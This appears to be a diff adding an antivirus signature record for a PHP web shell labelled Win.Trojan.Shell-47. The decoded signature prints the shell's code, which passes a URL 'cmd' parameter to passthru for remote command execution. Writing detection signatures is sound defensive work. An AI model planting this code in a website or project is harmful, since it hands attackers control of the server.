@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Shell-47
+TARGET TYPE: HTML
+OFFSET: *
+DECODED SIGNATURE:
+<?php ob_clean();echo\"hi master!\";ini_set(\"max_execution_time\",0);passthru(\$_get[cmd]);die;
